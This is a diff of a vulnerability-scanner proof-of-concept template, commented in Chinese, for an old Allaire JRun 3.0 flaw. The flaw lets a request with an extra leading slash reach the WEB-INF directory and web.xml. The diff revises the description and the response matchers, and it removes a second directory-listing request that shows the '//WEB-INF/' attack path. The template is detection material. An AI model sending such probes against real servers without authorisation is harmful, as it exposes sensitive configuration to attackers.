@@ -1,6 +1,6 @@
 [info]
 author = "ave"
-description = "通过向 JRun 3.0 HTTP Servlet 服务器发送包含额外前导斜杠的 URL 请求（如 //WEB-INF/web.xml），检测是否存在 WEB-INF 目录绕过访问控制漏洞。若响应包含 web.xml 等敏感内容则判定存在漏洞。"
+description = "验证 Allaire JRun 3.0 http servlet server 是否允许远程攻击者通过在请求路径起始位置添加额外斜杠直接访问 WEB-INF 目录，导致敏感配置文件泄露"
 id = "POC-AVE-2000-0762"
 name = "Allaire JRun 3 Directory Disclosure PoC"
 severity = "medium"
@@ -11,7 +11,7 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
@@ -20,24 +20,14 @@ protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "<web-app",
-    "WEB-INF",
-    "web.xml",
-]
-
-[[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}//WEB-INF/"
-protocol = "http"
+status = [200]
+type = "status"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "WEB-INF",
-    "Directory listing",
+    "<?xml",
+    "<web-app",
 ]
